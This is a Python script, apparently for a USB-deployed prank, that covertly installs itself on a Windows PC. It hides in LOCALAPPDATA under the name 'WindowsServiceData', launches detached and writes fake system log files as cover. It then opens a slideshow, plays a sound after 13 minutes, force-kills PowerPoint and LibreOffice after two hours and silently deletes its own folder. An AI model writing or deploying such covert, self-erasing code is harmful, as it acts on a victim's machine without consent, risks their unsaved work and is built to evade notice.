import datetime
import os
import random
import shutil
import string
import subprocess
import sys
import threading
import time
from pathlib import Path

try:
    import pygame
except ImportError:
    pygame = None
try:
    import winsound
except Exception:
    winsound = None

# --- CONFIGURATION DES CHEMINS ---
TEMP_DIR = Path(os.environ.get("LOCALAPPDATA", r"C:\Temp")) / "WindowsServiceData"
NOM_SCRIPT = "service_task.py"
NOM_DIAPO = "tx.odp"
NOM_DOSSIER_SONS = "sons_data"

# Chemins cibles sur le PC
DIAPO_DEST = TEMP_DIR / NOM_DIAPO
SONS_DEST = TEMP_DIR / NOM_DOSSIER_SONS
SCRIPT_DEST = TEMP_DIR / NOM_SCRIPT
STOP_EVENT = threading.Event()


def _get_default_app_command_for_extension(ext: str) -> str | None:
    """Return the ftype command string for a given extension (Windows), or None.

    Uses `assoc` then `ftype` via cmd to determine the program used to open the extension.
    """
    try:
        # assoc .ext -> FileType
        r = subprocess.run(["cmd", "/c", f"assoc {ext}"], capture_output=True, text=True)
        out = r.stdout.strip()
        if "=" not in out:
            return None
        filetype = out.split("=", 1)[1]
        r2 = subprocess.run(["cmd", "/c", f"ftype {filetype}"], capture_output=True, text=True)
        out2 = r2.stdout.strip()
        if "=" not in out2:
            return None
        cmd = out2.split("=", 1)[1]
        return cmd
    except Exception:
        return None

def generer_bruit_logs() -> None:
    prefixes = ["sys_check", "win_update", "kern_log"]
    TEMP_DIR.mkdir(parents=True, exist_ok=True)

    for _ in range(20):
        name = f"{random.choice(prefixes)}_{''.join(random.choices(string.digits, k=4))}.log"
        path = TEMP_DIR / name
        try:
            path.write_text(f"{datetime.datetime.now()} [INFO] System heartbeat OK\n", encoding="utf-8")
        except OSError:
            continue


def jouer_sons_aleatoires(stop_event: threading.Event, play_at: float | None = None) -> None:
    # Prefer pygame when available
    if pygame is None:
        # Fallback mode when pygame is not available.
        # Use winsound for WAV files, and os.startfile() to open other formats
        # with the user's default application (no extra packages required).
        if not SONS_DEST.exists():
            return

        extensions = (".mp3", ".wav", ".ogg", ".m4a")
        liste_sons = [p for p in SONS_DEST.iterdir() if p.suffix.lower() in extensions and p.is_file()]
        if not liste_sons:
            return

        # Wait until the scheduled play time
        while play_at is not None and not stop_event.is_set():
            remaining = play_at - time.monotonic()
            if remaining <= 0:
                break
            stop_event.wait(min(remaining, 0.5))

        if stop_event.is_set():
            return

        try:
            son = random.choice(liste_sons)
            file_path = str(son)
            print(f"soundboard: playing (fallback) {file_path}")
            if son.suffix.lower() == ".wav" and winsound is not None:
                try:
                    winsound.PlaySound(file_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
                except Exception:
                    try:
                        os.startfile(file_path)
                    except Exception:
                        pass
            else:
                try:
                    assoc_cmd = _get_default_app_command_for_extension(son.suffix.lower())
                    if assoc_cmd:
                        print(f"soundboard: default app for {son.suffix.lower()} -> {assoc_cmd}")
                    else:
                        print(f"soundboard: no associated app for {file_path}; Windows may prompt")
                    os.startfile(file_path)
                except Exception:
                    pass

            # Keep thread alive for the rest of the mission, while respecting stop requests.
            while not stop_event.is_set():
                stop_event.wait(0.5)
        except Exception:
            pass
        return

    if not SONS_DEST.exists():
        return

    try:
        pygame.mixer.pre_init(44100, -16, 2, 2048)
        pygame.mixer.init()
    except Exception:
        try:
            pygame.mixer.quit()
        except Exception:
            pass
        return

    extensions = (".mp3", ".wav", ".ogg", ".m4a")
    liste_sons = [p for p in SONS_DEST.iterdir() if p.suffix.lower() in extensions and p.is_file()]
    if not liste_sons:
        try:
            pygame.mixer.quit()
        except Exception:
            pass
        return

    # Wait until the scheduled play time
    while play_at is not None and not stop_event.is_set():
        remaining = play_at - time.monotonic()
        if remaining <= 0:
            break
        stop_event.wait(min(remaining, 0.5))

    if stop_event.is_set():
        try:
            pygame.mixer.quit()
        except Exception:
            pass
        return

    try:
        son_choisi = random.choice(liste_sons)
        file_path = str(son_choisi)
        print(f"soundboard: playing (pygame) {file_path}")
        pygame.mixer.music.load(file_path)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy() and not stop_event.is_set():
            stop_event.wait(0.5)
    except Exception:
        pass
    finally:
        try:
            pygame.mixer.music.stop()
        except Exception:
            pass
        try:
            pygame.mixer.quit()
        except Exception:
            pass


def stop_presentation() -> None:
    targets = ["soffice.bin", "soffice.exe", "simpress.exe", "powerpnt.exe"]
    for process_name in targets:
        subprocess.run(
            ["taskkill", "/f", "/im", process_name, "/t"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=False,
        )


def mission() -> None:
    total_seconds = 2 * 60 * 60
    sound_delay = 13 * 60
    play_at = time.monotonic() + sound_delay
    print(f"mission: running for {total_seconds} seconds, scheduled sound in {sound_delay} seconds")

    audio_thread = threading.Thread(target=jouer_sons_aleatoires, args=(STOP_EVENT, play_at), daemon=True)
    audio_thread.start()

    generer_bruit_logs()

    if DIAPO_DEST.exists():
        try:
            os.startfile(str(DIAPO_DEST))
        except OSError:
            pass

    time.sleep(total_seconds)
    stop_presentation()

    STOP_EVENT.set()
    audio_thread.join(timeout=5)

    cmd_del = f'timeout /t 5 & rd /s /q "{TEMP_DIR}"'
    subprocess.Popen(
        cmd_del,
        shell=True,
        creationflags=0x08000000,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    sys.exit(0)

def installer_et_lancer() -> bool:
    current_script = Path(__file__).resolve()
    if current_script.parent.resolve() == TEMP_DIR.resolve():
        return False

    TEMP_DIR.mkdir(parents=True, exist_ok=True)

    shutil.copy2(str(current_script), str(SCRIPT_DEST))

    source_diapo = current_script.parent / NOM_DIAPO
    if source_diapo.exists():
        shutil.copy2(str(source_diapo), str(DIAPO_DEST))

    source_sons = current_script.parent / NOM_DOSSIER_SONS
    if source_sons.exists():
        if SONS_DEST.exists():
            shutil.rmtree(str(SONS_DEST))
        shutil.copytree(str(source_sons), str(SONS_DEST))

    subprocess.Popen(
        [sys.executable, str(SCRIPT_DEST)],
        creationflags=0x00000008,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        shell=False,
    )
    print("Installation terminée. Vous pouvez retirer la clé.")
    return True


if __name__ == "__main__":
    if not installer_et_lancer():
        mission()
